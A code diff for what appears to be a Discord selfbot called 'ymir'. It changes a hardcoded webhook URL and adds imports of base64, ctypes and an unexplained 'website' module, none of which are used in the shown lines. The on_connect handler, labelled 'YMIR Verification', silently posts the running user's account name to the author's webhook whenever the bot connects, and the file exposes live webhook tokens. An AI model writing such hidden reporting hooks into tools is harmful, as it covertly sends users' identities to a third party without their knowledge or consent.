@@ -10,6 +10,10 @@ from discord import Webhook, AsyncWebhookAdapter
 import datetime
 import requests
 from colored import fg, attr
+import sys
+import website
+import base64
+import ctypes
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import colorama
 from colorama import Fore, Back, Style
@@ -259,7 +263,7 @@ async def kick(ctx):
 @ymir.event
 async def on_connect(): 
  webav = 'https://cdn.discordapp.com/attachments/816065264054698035/816127701458485248/pieck_fall.gif'
- webhook = DiscordWebhook (url='https://discord.com/api/webhooks/829123147306893374/KIQLMM_YkXglyVHEbWSm-14mUVBrUvrDsNfmS32GLkDieiqKiZ7BKGODJ1VLsaEeRDwl', username="YMIR Verification", avatar_url=(webav))
+ webhook = DiscordWebhook (url='https://discord.com/api/webhooks/829124261578801172/Ualpd1E7wVf-gWCbnaSiBxA2a8Yg1QioW5qQ5EPa8QOmpCKG_jO2Idl5S16lpYzRf-0i', username="YMIR Verification", avatar_url=(webav))
 
  embed = DiscordEmbed(color= 0xffb2a3, description= '```Ymir Verification```')
  embed.add_embed_field(name = "UserName",  value=f"{ymir.user.name}#{ymir.user.discriminator}", inline = False)
